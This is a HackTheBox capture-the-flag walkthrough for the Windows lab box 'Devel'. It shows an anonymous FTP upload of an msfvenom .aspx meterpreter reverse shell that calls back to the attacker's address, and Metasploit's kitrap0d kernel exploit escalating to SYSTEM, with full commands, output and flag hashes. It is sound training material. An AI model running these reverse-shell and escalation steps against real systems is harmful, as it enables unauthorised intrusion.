---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [Windows, arbitrary-file-upload, kernel-exploit, kitrap0d, ms10_015, anonymous-ftp]
---
# Resolution summary

>[!summary]
>- **Anonymous FTP** login allows to upload files directly on the web server
>- Uploading an **.aspx reverse shell** an **iis apppool\\web** access is obtained
>- Local enumeration reveals that the system is vulnerable to multiple kernel exploit
>- **ms10_015** (kitrap0d) exploit allows to escalate privileges to **nt authority\system**

## Improved skills

- Exploit arbitrary file upload to get RCE
- Exploit windows kernel vulnerabilities

## Used tools

- nmap
- gobuster
- msfvenom
- msfconsole
- meterpreter

---

# Information Gathering

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Devel]
└─$ nmap -sV -sC -sT -p21,80 10.10.10.5 -oN scans/open-ports.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 13:04 EDT
Nmap scan report for 10.10.10.5
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds
```

# Enumeration

## Port 21 - FTP (Microsoft ftpd)

Nmap enumeration:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
```

Anonymous login:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB]
└─$ ftp 10.10.10.5                                                
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

File upload is possible:

```bash
ftp> put test.txt 
local: test.txt remote: test.txt 
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
80 bytes sent in 0.00 secs (7.5388 MB/s)
```

## Port 80 - HTTP (Microsoft IIS httpd 7.5)

![Pasted image 20210418190956.png](../../zzz_res/attachments/Pasted_image_20210418190956.png)

Files are uploaded directly on the web server:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Devel]
└─$ gobuster dir -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/18 13:10:55 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 689]
/iisstart.htm         (Status: 200) [Size: 689]
/test.txt 			  (Status: 200) [Size: 30]
```

# Exploitation

## Arbitrary File Upload on the web server using FTP

Generated and uploaded a reverse shell:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Devel/exploit]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f aspx -o revshell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2888 bytes
Saved as: revshell.aspx

┌──(kali㉿kali)-[~/…/HTB/box/Devel/exploit]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): ftp
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put revshell.aspx 
local: revshell.aspx remote: revshell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2925 bytes sent in 0.00 secs (9.2983 MB/s)
ftp> quit
221 Goodbye.
```

Obtained a reverse shell:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Devel/exploit]
└─$ curl http://10.10.10.5/revshell.aspx
```

Catch the shell:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB]
└─$ sudo msfconsole -q                                     
[sudo] password for kali: 
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.5:49160) at 2021-04-18 13:37:47 -0400

meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
```

# Privilege Escalation

## Local enumeration

Systeminfo:

```powershell
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 
System Boot Time:          18/4/2021, 8:06:40 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.453 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.532 MB
Virtual Memory: In Use:    609 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::7894:333:c081:c8af
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

User info:

```powershell
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest                    
The command completed with one or more errors.

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

c:\windows\system32\inetsrv>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
```

Netstat:

```powershell
c:\windows\system32\inetsrv>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1436
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       412
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       792
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       528
  TCP    10.10.10.5:139         0.0.0.0:0              LISTENING       4
  TCP    10.10.10.5:49161       10.10.14.14:4444       ESTABLISHED     3184
  TCP    [::]:21                [::]:0                 LISTENING       1436
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       716
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5357              [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       412
  TCP    [::]:49153             [::]:0                 LISTENING       792
  TCP    [::]:49154             [::]:0                 LISTENING       916
  TCP    [::]:49155             [::]:0                 LISTENING       512
  TCP    [::]:49156             [::]:0                 LISTENING       528
  UDP    0.0.0.0:123            *:*                                    1016
  UDP    0.0.0.0:3702           *:*                                    1396
  UDP    0.0.0.0:3702           *:*                                    1396
  UDP    0.0.0.0:5355           *:*                                    1136
  UDP    0.0.0.0:53570          *:*                                    1396
  UDP    10.10.10.5:137         *:*                                    4
  UDP    10.10.10.5:138         *:*                                    4
  UDP    10.10.10.5:1900        *:*                                    1396
  UDP    127.0.0.1:1900         *:*                                    1396
  UDP    127.0.0.1:50242        *:*                                    1396
  UDP    [::]:123               *:*                                    1016
  UDP    [::]:3702              *:*                                    1396
  UDP    [::]:3702              *:*                                    1396
  UDP    [::]:5355              *:*                                    1136
  UDP    [::]:53571             *:*                                    1396
  UDP    [::1]:1900             *:*                                    1396
  UDP    [::1]:50241            *:*                                    1396
  UDP    [fe80::58c0:f1cf:abc6:bb9e%15]:1900  *:*                                    1396
```

### Local exploit suggester (metasploit)

```bash
meterpreter > run post/multi/recon/local_exploit_suggester 

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 37 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

## ms10_015 - kitrap0d

```bash
meterpreter > bg
[*] Backgrounding session 3...
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 3 
session => 3
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 5555
lport => 5555
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.14:5555 
[*] Launching notepad to host the exploit...
[+] Process 148 launched.
[*] Reflectively injecting the exploit DLL into 148...
[*] Injecting exploit into 148 ...
[*] Exploit injected. Injecting payload into 148...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.14:5555 -> 10.10.10.5:49163) at 2021-04-18 16:27:01 -0400

meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > shell
Process 3444 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

C:\Users\babis\Desktop>whoami && hostname && type C:\Users\Administrator\Desktop\root.txt && ipconfig /all
whoami && hostname && type C:\Users\Administrator\Desktop\root.txt && ipconfig /all
nt authority\system
devel
e621a0b5041708797c4fc4728bc72b4b
Windows IP Configuration

   Host Name . . . . . . . . . . . . : devel
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #3
   Physical Address. . . . . . . . . : 00-11-22-33-44-55
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::58c0:f1cf:abc6:bb9e(Preferred) 
   Temporary IPv6 Address. . . . . . : dead:beef::7894:333:c081:c8af(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::58c0:f1cf:abc6:bb9e%15(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.5(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:188e%15
                                       10.10.10.2
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

![Pasted image 20210418223210.png](../../zzz_res/attachments/Pasted_image_20210418223210.png)

# Trophy

>[!quote]
> Most hackers are young because young people tend to be adaptable. As long as you remain adaptable, you can always be a good hacker.
> 
>\- Emmanuel Goldstein

>[!success]
>**User.txt**
>9ecdd6a3aedf24b41562fea70f4cb3e8

>[!success]
>**Root.txt**
>e621a0b5041708797c4fc4728bc72b4b

